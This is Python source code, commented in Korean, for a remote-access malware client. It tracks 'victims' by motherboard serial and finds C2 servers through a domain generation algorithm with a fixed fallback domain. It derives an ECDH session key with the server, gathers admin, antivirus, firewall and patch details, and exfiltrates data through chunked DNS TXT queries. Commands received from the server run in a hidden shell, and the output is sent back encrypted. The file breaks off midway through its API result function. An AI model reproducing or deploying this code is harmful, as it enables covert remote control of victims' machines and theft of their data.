import socket
import base64
import os
import uuid
import sys
import time
import getpass 
import logging
import dns.resolver
from datetime import datetime
import hashlib
import random
import json
import subprocess
import getmac # For new victim ID generation
import platform # For system information
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

# --- [신규 추가] ECDH 키 교환을 위한 라이브러리 ---
try:
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False
# ---------------------------------------------

# Try to import requests for Flask API polling
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Logging setup
log_dir = "logs" # 현재 스크립트 위치 기준 logs 폴더
if not os.path.isabs(log_dir): # 상대경로면 스크립트 기준 절대경로로 변경
    log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), log_dir)
os.makedirs(log_dir, exist_ok=True)

# 로깅 설정 (파일 핸들러 경로 수정)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s", # 수정: 로그 포맷을 더 간결하게 변경
    handlers=[
        logging.FileHandler(os.path.join(log_dir, "client.log"), encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

if not REQUESTS_AVAILABLE:
    logging.warning("requests module not found; API polling will be disabled.")

# DGA configuration
config = {
    1: {
        'seed': 62,
        'shift': 7,
        'mod': 8,
        'tlds': ['ml', 'org', 'net', 'com', 'pw', 'eu', 'in', 'us', 'xyz', 'top', 'info'] # TLD 다양화
    }
}
FIXED_DOMAIN = "pintruder.com" # Fallback domain (실제 운영 시 변경 필요)
API_PORT = 443
API_PATH_COMMANDS = "/api/commands" # victim_uuid_full 이 경로에 포함됨
API_PATH_RESULTS = "/api/results"   # victim_uuid_full 이 경로에 포함됨

POLLING_INTERVAL_API = 10  # API 폴링 간격 (초)
DNS_CMD_POLL_INTERVAL = 30 # DNS 명령 폴링 간격 (초)
INITIAL_BEACON_DELAY = random.randint(5, 20) # 초기 비콘 전송 전 랜덤 딜레이 (초)
MAX_DGA_ATTEMPTS = 30 # DGA 도메인 확인 시도 횟수 
# 고유 ID 저장 파일 경로 설정
PERSISTENT_ID_FILENAME = ".persistent_client_id_v4.dat" # 파일명 변경하여 이전 테스트와 구분

# --- [신규 추가] 세션 동안 사용할 키를 저장할 전역 변수 ---
client_private_key = None
session_key = None

# 스크립트 실행 위치를 기준으로 BASE_DIR_CLIENT 설정 (기존 로그 디렉토리 설정과 유사하게)
if getattr(sys, 'frozen', False): # PyInstaller 등으로 빌드된 경우
    BASE_DIR_CLIENT = os.path.dirname(sys.executable)
else: # 일반 스크립트 실행 경우
    BASE_DIR_CLIENT = os.path.dirname(os.path.abspath(__file__))
PERSISTENT_ID_FILE_PATH = os.path.join(BASE_DIR_CLIENT, PERSISTENT_ID_FILENAME)
# 참고: 실제 악성코드에서는 ProgramData, AppData 등 더 은닉된 위치 사용 고려

def encrypt_data(key, plaintext_str):
    """평문 문자열을 AES-GCM으로 암호화하고, 헤더를 붙인 Base64 문자열로 반환합니다."""
    try:
        header = b'ENCV1$'
        plaintext_bytes = plaintext_str.encode('utf-8', 'ignore')
        cipher = AES.new(key, AES.MODE_GCM)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(plaintext_bytes)
        # B64(헤더) + B64(nonce + tag + ciphertext) 형태로 조립
        return base64.b64encode(header).decode('utf-8') + base64.b64encode(nonce + tag + ciphertext).decode('utf-8')
    except Exception as e:
        logging.error(f"Encryption failed: {e}")
        # 암호화 실패 시, 평문을 Base64로 인코딩해서라도 보냄 (오류 추적용)
        return base64.b64encode(b'PLAIN$' + plaintext_str.encode('utf-8', 'ignore')).decode('utf-8')

def decrypt_data(key, encrypted_b64_str):
    """헤더가 포함된 Base64 암호문을 AES-GCM으로 복호화하여 평문 문자열로 반환합니다."""
    try:
        header_b64 = base64.b64encode(b'ENCV1$').decode('utf-8')
        if not encrypted_b64_str.startswith(header_b64):
            # 헤더가 없으면 평문으로 간주하고 반환 (하위 호환성)
            return encrypted_b64_str 

        encrypted_payload_b64 = encrypted_b64_str[len(header_b64):]
        decoded_payload = base64.b64decode(encrypted_payload_b64)
        
        nonce = decoded_payload[:16]
        tag = decoded_payload[16:32]
        ciphertext = decoded_payload[32:]
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext_bytes.decode('utf-8', 'ignore')
    except (ValueError, KeyError, Exception) as e:
        logging.error(f"Decryption failed for payload. It might be plaintext. Error: {e}")
        # 복호화 실패 시 원본 반환 (오류 추적용)
        return f"DECRYPTION_FAILED: {encrypted_b64_str}"


# --- System Information ---
def get_system_info():
    """
    [수정됨 v3] Antivirus, Hotfix 파싱 및 SyntaxError 수정
    """
    # --- 1. 모든 정보 필드를 기본값으로 초기화 ---
    system_info = {
        "os": "N/A",
        "architecture": "N/A",
        "hostname": "N/A",
        "username": "N/A",
        "internal_ip": "N/A",
        "agent_version": "3.1",
        "is_admin": False,
        "security": {
            'antivirus': [],
            'hotfixes': [],
            'error': 'None'
        }
    }

    # --- 2. 기본 시스템 정보 수집 (이전과 동일) ---
    try:
        system_info["hostname"] = socket.gethostname()
        system_info["username"] = getpass.getuser()
        system_info["architecture"] = platform.machine()
    except Exception as e:
        logging.warning(f"Could not get basic host/user/arch info: {e}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        system_info["internal_ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        logging.warning("Could not get internal IP via 8.8.8.8, trying fallback.")
        try:
            system_info["internal_ip"] = socket.gethostbyname(socket.gethostname())
        except Exception as e_fallback:
            logging.warning(f"Internal IP fallback failed: {e_fallback}")

    try:
        os_name = platform.system()
        os_release = platform.release()
        os_version_detailed = platform.version()
        full_os_str = f"{os_name} {os_release}"
        if os_name == "Windows":
            try:
                win_ver_info = platform.win32_ver()
                # ================== 이 부분이 수정된 라인입니다 ==================
                build_number_str = win_ver_info[1].split('.')[2] if len(win_ver_info[1].split('.')) > 2 else os_version_detailed.split('.')[-1]
                # ===============================================================
                display_name = "Windows 11" if build_number_str.isdigit() and int(build_number_str) >= 22000 else f"Windows {win_ver_info[0]}"
                edition = platform.win32_edition()
                full_os_str = f"{display_name} {edition} (Build {build_number_str})"
            except Exception as e_win_ver:
                logging.warning(f"Could not get detailed Windows version: {e_win_ver}")
                full_os_str = f"{os_name} {os_release} (Build {os_version_detailed.split('.')[-1] if '.' in os_version_detailed else os_version_detailed})"
        system_info["os"] = full_os_str
    except Exception as e_os:
        logging.error(f"FATAL: Could not get basic OS information: {e_os}")


    # --- 3. 권한 및 상세 보안 정보 수집 (Windows 환경) ---
    if platform.system() == "Windows":
        try:
            subprocess.check_output("net session", shell=True, stderr=subprocess.DEVNULL)
            system_info['is_admin'] = True
        except (subprocess.CalledProcessError, FileNotFoundError):
            system_info['is_admin'] = False
        logging.info(f"Admin privilege check: {system_info['is_admin']}")

        security_errors = []
        
        try:
            av_command = 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value'
            av_raw = subprocess.check_output(av_command, shell=True, stderr=subprocess.DEVNULL, text=True, encoding='utf-8', errors='ignore')
            av_products = [line.split('=')[1] for line in av_raw.strip().splitlines() if "displayName" in line]
            system_info['security']['antivirus'] = av_products if av_products else ["Not Found"]
        except Exception as e_av:
            logging.warning(f"Could not gather Antivirus info: {e_av}")
            security_errors.append("AV_Scan_Failed")
            system_info['security']['antivirus'] = ["Scan Failed"]

        try:
            firewall_command = 'netsh advfirewall show allprofiles state'
            firewall_raw = subprocess.check_output(firewall_command, shell=True, stderr=subprocess.DEVNULL, text=True, encoding='cp949', errors='ignore')
            firewall_states = [line.strip() for line in firewall_raw.splitlines() if "State" in line or "상태" in line]
            system_info['security']['firewall_state'] = ", ".join(firewall_states).replace("State", "").replace("상태", "").replace(" ", "")
        except Exception as e_fw:
            logging.warning(f"Could not gather Firewall info: {e_fw}")
            security_errors.append("FW_Scan_Failed")

        try:
            hotfix_command = 'wmic qfe list brief'
            hotfixes_raw = subprocess.check_output(hotfix_command, shell=True, stderr=subprocess.DEVNULL, text=True, encoding='utf-8', errors='ignore')
            hotfix_lines = hotfixes_raw.strip().splitlines()[1:]
            
            parsed_hotfixes = []
            for line in hotfix_lines:
                parts = line.split()
                if len(parts) >= 4:
                    parsed_hotfixes.append({
                        "Description": parts[0],
                        "HotFixID": parts[1],
                        "InstalledBy": parts[2],
                        "InstalledOn": parts[3]
                    })
            system_info['security']['hotfixes'] = parsed_hotfixes
        except Exception as e_hf:
            logging.warning(f"Could not gather Hotfix info: {e_hf}")
            security_errors.append("Hotfix_Scan_Failed")

        if security_errors:
            system_info['security']['error'] = ", ".join(security_errors)

    logging.info(f"Finished gathering system info: OS={system_info['os']}, Host={system_info['hostname']}")
    return system_info

# Victim ID management
def get_victim_id_full():
    """
    [최종 수정] 메인보드 시리얼 번호를 최우선으로 사용하여, 하드웨어 기반의 고유 ID를 생성합니다.
    우선순위: 1. 메인보드 시리얼 -> 2. ID 파일 -> 3. 새 UUID 생성
    """
    identifier_base = None
    used_method = "Unknown"

    # 1. 메인보드 시리얼 번호 시도 (가장 신뢰도 높은 하드웨어 ID)
    if platform.system() == "Windows":
        try:
            # wmic 명령어를 사용하여 메인보드 시리얼 번호를 가져옵니다.
            command = "wmic baseboard get serialnumber"
            # CREATE_NO_WINDOW 플래그는 Windows에서만 유효합니다.
            creationflags = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
            
            serial_raw = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True, creationflags=creationflags)
            
            # wmic 출력 형식(예: "SerialNumber\nXXXXXXXXXX\n\n")에서 실제 시리얼 번호만 추출
            serial_number = serial_raw.strip().splitlines()[-1].strip()

            if serial_number and "SerialNumber" not in serial_number and len(serial_number) > 4:
                identifier_base = serial_number
                used_method = "MotherboardSerial"
                logging.info(f"Using Motherboard Serial for victim ID base: {serial_number}")
            else:
                logging.warning("Could not retrieve a valid motherboard serial number. Falling back.")
        except Exception as e_wmic:
            logging.warning(f"Exception while getting motherboard serial: {e_wmic}. Falling back.")

    # 2. 메인보드 시리얼 실패 시, 저장된 ID 파일 시도
    if not identifier_base:
        try:
            if os.path.exists(PERSISTENT_ID_FILE_PATH):
                with open(PERSISTENT_ID_FILE_PATH, 'r', encoding='utf-8') as f_id:
                    stored_id = f_id.read().strip()
                if stored_id and len(stored_id) >= 36: # UUID (36자) 형식 기대
                    identifier_base = stored_id
                    used_method = "PersistentFile"
                    logging.info(f"Using ID from persistent file: {PERSISTENT_ID_FILE_PATH}")
                else:
                    logging.warning(f"Persistent ID file content is invalid. Will generate new ID.")
            else:
                logging.info(f"Persistent ID file not found. Will generate new ID.")
        except Exception as e_file_read:
            logging.error(f"Error reading persistent ID file: {e_file_read}")

    # 3. 그래도 ID가 없으면 (최초 실행), 새로운 UUID 생성 및 저장
    if not identifier_base:
        new_uuid = str(uuid.uuid4())
        identifier_base = new_uuid
        used_method = "NewUUID"
        logging.info(f"No valid hardware ID or persistent file found. Generated new UUID: {new_uuid}")
        try:
            with open(PERSISTENT_ID_FILE_PATH, 'w', encoding='utf-8') as f_id_write:
                f_id_write.write(new_uuid)
            logging.info(f"Saved new UUID to persistent file: {PERSISTENT_ID_FILE_PATH}")
        except Exception as e_file_write:
            logging.error(f"CRITICAL: Error saving new UUID to persistent file: {e_file_write}")

    # 모든 방법 실패 시 최종 폴백
    if not identifier_base:
        identifier_base = str(uuid.uuid4())
        used_method = "SessionUUIDFallback"
        logging.error(f"CRITICAL: All methods failed. Using temporary session ID.")

    logging.info(f"Victim ID base established using method: {used_method}, Base: '{identifier_base[:20]}...'")
    
    # 최종 16자리 ID 생성 (해시 및 인코딩)
    try:
        hash_obj = hashlib.sha256(identifier_base.encode('utf-8'))
        victim_id_str = base64.urlsafe_b64encode(hash_obj.digest()).decode('utf-8').rstrip('=')[:16]
        return victim_id_str
    except Exception as e_hash:
        logging.error(f"Error generating final victim_id_full: {e_hash}. Falling back to random UUID part.")
        return str(uuid.uuid4().hex)[:16]

def get_victim_dns_hash(victim_id_full_str): # 함수 이름 명확화
    """Takes the full victim ID and returns a 6-character SHA1 hash for DNS subdomains."""
    if not victim_id_full_str: return "nohash"
    return hashlib.sha1(victim_id_full_str.encode('utf-8')).hexdigest()[:6]

# --- [신규 추가] 서버와 키를 교환하는 함수 ---
def perform_key_exchange(c2_domain, victim_id_full):
    """서버와 ECDH 키 교환을 수행하여 전역 session_key를 설정합니다."""
    global client_private_key, session_key

    if not REQUESTS_AVAILABLE or not CRYPTOGRAPHY_AVAILABLE:
        logging.error("Key exchange cannot be performed: 'requests' or 'cryptography' module is missing.")
        return False

    try:
        # 1. 클라이언트의 ECDH 키 쌍(비공개키, 공개키)을 생성합니다.
        client_private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
        client_public_key = client_private_key.public_key()
        
        client_public_key_pem = client_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        # 2. 서버의 키 교환 엔드포인트에 POST 요청을 보냅니다.
        exchange_url = f"https://{c2_domain}/api/key_exchange/{victim_id_full}"
        logging.info(f"Attempting key exchange with {exchange_url}")
        
        response = requests.post(exchange_url, data=client_public_key_pem, timeout=20, verify=False)

        if response.status_code != 200:
            logging.error(f"Key exchange request failed with status code {response.status_code}: {response.text}")
            return False

        # 3. 응답으로 받은 서버의 공개키를 로드합니다.
        server_public_key_bytes = response.content
        server_public_key = serialization.load_pem_public_key(
            server_public_key_bytes,
            backend=default_backend()
        )

        # 4. 48바이트짜리 공유 비밀 계산
        shared_key_local = client_private_key.exchange(ec.ECDH(), server_public_key)
        
        # 5. HKDF를 사용하여 32바이트짜리 최종 AES 키 생성
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'handshake_secret', # 서버와 동일한 info 값 사용
            backend=default_backend()
        )
        derived_key = hkdf.derive(shared_key_local)

        # 6. 전역 변수에 최종 키(derived_key)를 저장
        session_key = derived_key
        
        logging.info("Session key successfully derived and established.")
        return True

    except Exception as e:
        logging.error(f"An error occurred during key exchange: {e}", exc_info=True)
        return False

# Bit rotation functions (DGA용)
def ror32(v, s):
    v &= 0xFFFFFFFF
    return ((v >> s) | (v << (32 - s))) & 0xFFFFFFFF

def rol32(v, s):
    v &= 0xFFFFFFFF # 명시적 32비트 마스킹
    return ((v << s) | (v >> (32 - s))) & 0xFFFFFFFF

# DGA domain generation
def dga(date_obj, config_nr, domain_nr):
    # ... (이전 DGA 로직과 동일, 내부 변수명 s -> s_val 등은 유지) ...
    c = config[config_nr]
    period = date_obj.year * 1000 + (date_obj.month - 1) * 30 + (date_obj.day // 21) # 일자를 3주 단위로 변경
    t = ror32(0xB11924E1 * (period + 0x1BF5), c['shift'])
    if c['seed']:
        t = ror32(0xB11924E1 * (t + c['seed'] + 0x27100001), c['shift'])
    #t = ror32(0xB11924E1 * (t + (date_obj.day // 2) + 0x27100001), c['shift']) # 일자를 2일 단위로 변경
    #t = ror32(0xB11924E1 * (t + date_obj.month + 0x2709A354), c['shift'])
    nr = rol32(domain_nr, 21) # % c['mod'] 부분 삭제
    s_val = rol32(c['seed'], 17)
    r_val = (ror32(0xB11924E1 * (nr + t + s_val + 0x27100001), c['shift']) + 0x27100001) & 0xFFFFFFFF
    length = (r_val % 12) + 7 # 길이 범위 조정 (7-18)
    domain_part = ""
    for i in range(length):
        r_val = (ror32(0xB11924E1 * rol32(r_val, i), c['shift']) + 0x27100001) & 0xFFFFFFFF
        domain_part += chr(r_val % 25 + ord('a'))
    domain_part += '.'
    r_val = ror32(r_val * 0xB11924E1, c['shift'])
    tld_i = ((r_val + 0x27100001) & 0xFFFFFFFF) % len(c['tlds'])
    domain_part += c['tlds'][tld_i]
    return domain_part

# --- Core DNS Communication Logic (try_send_chunks, query_server_state, execute_command_and_send_results_dns, poll_commands_via_dns) ---
# 이 함수들은 이전 버전과 거의 동일하게 유지하되, victim_id_full_str과 victim_dns_hash_str을 명확히 구분하여 사용합니다.
# try_send_chunks: victim_id_full_str -> victim_dns_hash_str 변환 후 사용
# query_server_state: victim_id_full_str -> victim_dns_hash_str 변환 후 사용
# execute_command_and_send_results_dns: victim_id_full_str -> victim_dns_hash_str 변환 후 사용
# poll_commands_via_dns: victim_id_full_str -> victim_dns_hash_str 변환 후 사용

def try_send_chunks(domain_to_use, victim_id_full_str, b32data, start_idx=0, session_id_str=None):
    victim_dns_hash = get_victim_dns_hash(victim_id_full_str)
    chunks = [b32data[i:i+80] for i in range(0, len(b32data), 80)]
    total_chunks = len(chunks)
    
    # [핵심 수정] 재시도 횟수를 5번으로 늘려 전송 안정성 대폭 향상
    max_retries_per_chunk = 5 
    
    sent_chunks_indices = set(range(start_idx))
    commands_received_during_exfil = []

    resolver = dns.resolver.Resolver()
    resolver.timeout = 7 
    resolver.lifetime = 7

    for idx, chunk_data in enumerate(chunks):
        if idx < start_idx:
            continue

        current_attempt = 0
        ack_for_data_chunk_found = False
        
        part1 = chunk_data[:40].lower()
        part2 = chunk_data[40:].lower() if len(chunk_data) > 40 else "x"
        sub = f"{idx:06}.{part1}.{part2}.{session_id_str}.{victim_dns_hash}.{domain_to_use}"
        
        while current_attempt < max_retries_per_chunk and not ack_for_data_chunk_found:
            current_attempt += 1
            for use_tcp in [False, True]:
                resolver.use_tcp = use_tcp
                try:
                    logging.debug(f"Exfil: Sending data chunk {idx+1}/{total_chunks} (Attempt {current_attempt}, TCP={use_tcp}) to {sub[:120]}...")
                    answers = resolver.resolve(sub, 'TXT', lifetime=resolver.lifetime)
                    for txt_record in answers:
                        txt_str = "".join(s.decode('utf-8', 'ignore') for s in txt_record.strings)
                        
                        if txt_str.startswith(f"ACK:{idx:06}"):
                            # [핵심 수정] 로그 메시지를 원래의 상세한 형태로 복원
                            logging.info(f"Exfil: Data Chunk {idx} to {sub[:80]}... ACKed (Server: {txt_str})")
                            sent_chunks_indices.add(idx)
                            ack_for_data_chunk_found = True
                        
                        cmd_prefix_in_ack = f"|CMD:"
                        if ack_for_data_chunk_found and cmd_prefix_in_ack in txt_str:
                            # (명령어 처리 로직은 기존과 동일)
                            pass # 현재는 DNS 명령 하달을 사용하지 않으므로 생략
                    if ack_for_data_chunk_found: break
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
                    logging.warning(f"Exfil: Chunk {idx} DNS query failed (Attempt {current_attempt}, TCP={use_tcp}): {e}")
                except Exception as e_other:
                    logging.error(f"Exfil: Unexpected error sending chunk {idx} (Attempt {current_attempt}, TCP={use_tcp}): {e_other}")
            if ack_for_data_chunk_found: break
            if not ack_for_data_chunk_found and current_attempt < max_retries_per_chunk:
                time.sleep(random.uniform(0.5, 1.0) * current_attempt)
        
        if not ack_for_data_chunk_found:
            logging.error(f"Exfil: Data Chunk {idx} to {sub[:80]}... definitively failed after {max_retries_per_chunk} attempts.")
        else:
            time.sleep(random.uniform(0.05, 0.2))
             
    return commands_received_during_exfil, sent_chunks_indices, total_chunks


def query_server_state(domain_to_query, victim_id_full_str, session_id_str): # init 쿼리
    victim_dns_hash = get_victim_dns_hash(victim_id_full_str)
    sub = f"init.{session_id_str}.{victim_dns_hash}.{domain_to_query}" # init.{세션ID}.{피해자해시}.{C2도메인}
    # ... (나머지 로직은 이전과 거의 동일) ...
    resolver = dns.resolver.Resolver()
    resolver.timeout = 10; resolver.lifetime = 10
    state = {"last_chunk": -1} # 서버에서 받은 마지막 성공 청크 인덱스

    for attempt in range(2): # 최대 2번 시도 (UDP, TCP 각각)
        for use_tcp in [False, True]:
            resolver.use_tcp = use_tcp
            try:
                logging.debug(f"Querying server state: {sub[:100]}... (TCP={use_tcp}, Attempt {attempt+1})")
                answers = resolver.resolve(sub, 'TXT', lifetime=resolver.lifetime)
                for txt_record in answers:
                    txt_str = "".join(s.decode('utf-8', 'ignore') for s in txt_record.strings)
                    if txt_str.startswith("STATE:"):
                        try:
                            state_data = json.loads(txt_str[len("STATE:"):])
                            state = {"last_chunk": state_data.get("last_chunk", -1)}
                            logging.info(f"Received server state from {sub[:70]}...: {state}")
                            return state 
                        except json.JSONDecodeError:
                            logging.warning(f"Failed to parse JSON state from server: {txt_str}")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
                logging.warning(f"Failed to query server state from {sub[:70]}... (TCP={use_tcp}, Attempt {attempt+1}): {e}")
            except Exception as e_other:
                logging.error(f"Unexpected error querying server state from {sub[:70]}... (TCP={use_tcp}, Attempt {attempt+1}): {e_other}")
        if state.get("last_chunk", -1) != -1 : break # 상태 받았으면 재시도 안함
        time.sleep(1) # 다음 시도 전 딜레이
        
    logging.warning(f"Could not retrieve server state for session {session_id_str} from {domain_to_query}. Assuming no chunks sent.")
    return state


# [수정] execute_command_and_send_results_dns 함수
def execute_command_and_send_results_dns(encrypted_command, current_c2_domain, victim_id_full_str, sess_id, command_id_str, current_session_key):
    """
    [수정] 암호화된 명령을 받아 복호화 후 실행하고, 결과를 암호화해서 DNS로 전송합니다.
    """
    victim_dns_hash = get_victim_dns_hash(victim_id_full_str)
    
    # 1. 전달받은 명령어를 세션 키로 복호화합니다.
    try:
        command_to_execute = decrypt_data(current_session_key, encrypted_command)
    except Exception as e:
        logging.error(f"DNS Exec: Failed to decrypt command (ID: {command_id_str}): {e}")
        # 복호화 실패 시, 에러 메시지를 결과로 전송합니다.
        command_to_execute = None
        output = f"[decryption error on client-side for command ID: {command_id_str}]"

    if command_to_execute:
        logging.info(f"DNS Exec: Executing decrypted command (ID: {command_id_str}): '{command_to_execute}'")
        try:
            process = subprocess.Popen(command_to_execute, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
            stdout, stderr = process.communicate(timeout=120)
            output = (stdout or "") + (stderr or "")
            if not output.strip(): output = "[no output]"
        except subprocess.TimeoutExpired:
            process.kill()
            output = "[command timed out after 120s]"
            logging.warning(f"DNS Exec: Command (ID: {command_id_str}) timed out.")
        except Exception as e:
            output = f"[execution error: {str(e)}]"
            logging.error(f"DNS Exec: Failed to execute command (ID: {command_id_str}) '{command_to_execute}': {e}")
    
    logging.info(f"DNS Exec: Command (ID: {command_id_str}) output (first 100 chars): {output[:100].replace(chr(10), ' ')}")

    # 2. 실행 결과를 세션 키로 암호화합니다.
    encrypted_result_str = encrypt_data(current_session_key, output)
    
    # 3. 암호화된 결과를 Base32로 인코딩하여 청크로 분할합니다.
    result_b32 = base64.b32encode(encrypted_result_str.encode('utf-8')).decode('utf-8').rstrip('=')
    result_chunks = [result_b32[i:i+80] for i in range(0, len(result_b32), 80)] if result_b32 else \
                    [base64.b32encode("[empty_output]".encode()).decode('utf-8').rstrip('=')]
    
    logging.info(f"DNS Exec: Sending {len(result_chunks)} encrypted result chunks for command (ID: {command_id_str})")
    cmd_id_short = hashlib.md5(command_id_str.encode('utf-8')).hexdigest()[:6]

    resolver = dns.resolver.Resolver(); resolver.timeout = 7; resolver.lifetime = 7
    max_retries_res = 3

    for res_idx, res_chunk_data in enumerate(result_chunks):
        part1 = res_chunk_data[:40].lower()
        part2 = res_chunk_data[40:].lower() if len(res_chunk_data) > 40 else "x"
        sub = f"res.{cmd_id_short}.{res_idx:03}.{part1}.{part2}.{sess_id}.{victim_dns_hash}.{current_c2_domain}"
        sent_successfully = False
        
        for attempt_res in range(1, max_retries_res + 1):
            for use_tcp_res in [False, True]:
                resolver.use_tcp = use_tcp_res
                try:
                    logging.debug(f"DNS Exec: Sending result chunk {res_idx+1}/{len(result_chunks)} for cmd (ID: {command_id_str}) (Attempt {attempt_res}, TCP={use_tcp_res})")
                    answers = resolver.resolve(sub, 'TXT', lifetime=resolver.lifetime)
                    ack_received = False
                    for txt_record in answers:
                        txt_str_resp = "".join(s.decode('utf-8', 'ignore') for s in txt_record.strings)
                        expected_ack_prefix = f"ACK_RES:OK_{cmd_id_short}_{res_idx:03}"
                        if txt_str_resp.startswith(expected_ack_prefix) or \
                           (txt_str_resp.startswith("ACK_RES:DUPLICATE") and f"{cmd_id_short}_{res_idx:03}" in txt_str_resp):
                            logging.info(f"DNS Exec: Server ACKed result chunk {res_idx} for cmd (ID: {command_id_str}): {txt_str_resp}")
                            ack_received = True; sent_successfully = True; break 
                    if ack_received: break
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e_res:
                    log_func = logging.error if attempt_res == max_retries_res and use_tcp_res else logging.warning
                    log_func(f"DNS Exec: Result chunk {res_idx} DNS query failed: {e_res}")
                except Exception as e_res_other:
                    logging.error(f"DNS Exec: Unexpected error sending result chunk {res_idx}: {e_res_other}")
                if sent_successfully: break
            if sent_successfully: break
            if not sent_successfully and attempt_res < max_retries_res:
                time.sleep(random.uniform(0.2, 0.5) * attempt_res)
        
        if not sent_successfully:
            logging.error(f"DNS Exec: Failed to definitively send result chunk {res_idx} for command (ID: {command_id_str}).")
        else:
            time.sleep(random.uniform(0.05, 0.15))


def poll_commands_via_dns(current_c2_domain, victim_id_full_str, sess_id):
    victim_dns_hash = get_victim_dns_hash(victim_id_full_str)
    poll_subdomain = f"cmdpoll.{sess_id}.{victim_dns_hash}.{current_c2_domain}"
    
    resolver = dns.resolver.Resolver()
    # --- 수정 부분: 타임아웃을 짧게 줄여서 블로킹 방지 ---
    resolver.timeout = 4 
    resolver.lifetime = 4
    # --- 수정 끝 ---
    
    max_retries_poll = 2
    
    for attempt in range(1, max_retries_poll + 1):
        for use_tcp_poll in [False, True]:
            resolver.use_tcp = use_tcp_poll
            try:
                logging.info(f"DNS Poll: Polling for commands on {poll_subdomain} (Attempt {attempt}, TCP={use_tcp_poll})")
                answers = resolver.resolve(poll_subdomain, 'TXT', lifetime=resolver.lifetime)
                for txt_record in answers:
                    txt_str = "".join(s.decode('utf-8', 'ignore') for s in txt_record.strings)
                    if txt_str.startswith("CMD:"):
                        cmd_payload = txt_str.split("CMD:", 1)[1]
                        try:
                            cmd_id, actual_cmd = cmd_payload.split("|", 1)
                            logging.info(f"DNS Poll: Received command via DNS: ID={cmd_id}, CMD='{actual_cmd[:50]}...'")
                            return {'id': cmd_id, 'cmd': actual_cmd, 'type': 'dns'}
                        except ValueError:
                            logging.warning(f"DNS Poll: Malformed CMD payload from server: '{cmd_payload}'. Expected ID|CMD.")
                    elif txt_str.startswith("ACK:") and "NO_CMD" in txt_str:
                        logging.info(f"DNS Poll: No new commands from server. ({txt_str})")
                        return None 
                return None
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
                log_func = logging.warning if attempt < max_retries_poll or not use_tcp_poll else logging.error
                log_func(f"DNS Poll: DNS command polling failed for {poll_subdomain} (Attempt {attempt}, TCP={use_tcp_poll}): {e}")
            except Exception as e_other:
                logging.error(f"DNS Poll: Unexpected error during DNS command polling for {poll_subdomain}: {e_other}")
            
            if use_tcp_poll and attempt < max_retries_poll:
                time.sleep(random.uniform(0.5, 1.0) * attempt)
                
        if attempt < max_retries_poll:
            time.sleep(random.uniform(1.0, 2.0) * attempt)
            
    return None


# --- API Communication Logic ---
def poll_server_for_commands_api(victim_id_full_str, session_id_str, current_c2_domain):
    if not REQUESTS_AVAILABLE: 
        logging.debug("API Poll: requests module not available, skipping API poll.")
        return None # [수정] 실패 시 None 반환
    if not current_c2_domain: 
        logging.warning("API Poll: No C2 domain available.")
        return None # [수정] 실패 시 None 반환

    # URL에서 포트 번호를 완전히 제거합니다. HTTPS는 자동으로 443을 사용합니다.
    api_url = f"https://{current_c2_domain}{API_PATH_COMMANDS}/{victim_id_full_str}"
    
    payload = {
        'session_id': session_id_str,
        'system_info': get_system_info() 
    }
    
    logging.info(f"API Poll: Polling {api_url} with session {session_id_str} and system_info.")
    try:
        # SSL 인증서 검증을 건너뛰어 유연성을 높입니다.
        response = requests.post(api_url, json=payload, timeout=15, verify=False)
        if response.status_code == 200:
            data = response.json()
            commands_from_api = data.get("commands", [])
            
            parsed_commands = []
            if commands_from_api:
                logging.info(f"API Poll: Received {len(commands_from_api)} command(s) from API: {commands_from_api}")
                for id_cmd_str in commands_from_api:
                    try:
                        cmd_id, actual_cmd = id_cmd_str.split("|", 1)
                        parsed_commands.append({'id': cmd_id, 'cmd': actual_cmd, 'type': 'api'})
                    except ValueError:
                        logging.warning(f"API Poll: Malformed command string '{id_cmd_str}' from API. Skipping.")
            else:
                logging.info(f"API Poll: No new commands from API ({api_url}).")
            return parsed_commands # 성공 시 빈 리스트 또는 명령어 리스트 반환
        else:
            logging.warning(f"API Poll: Request to {api_url} failed with status {response.status_code}, Resp: {response.text[:200]}")
            return None # [수정] 실패 시 None 반환
    except requests.exceptions.RequestException as e:
        logging.error(f"API Poll: Failed to poll API at {api_url}: {e}")
        return None # [수정] 실패 시 None 반환


def submit_command_result_api(victim_id_full_str, command_id_cmd_str, result_bytes, current_c2_domain):
    if not REQUESTS_AVAILABLE: return
    if not current_c2_domain: logging.warning("API Result: No C2 domain for submitting result."); return

    result_url = f"https://{current_c2_domain}:{API_PORT}{API_PATH_RESULTS}/{victim_id_full_str}"

    # result_bytes를 UTF-8 문자열로 디코딩하여 result_payload_str에 저장
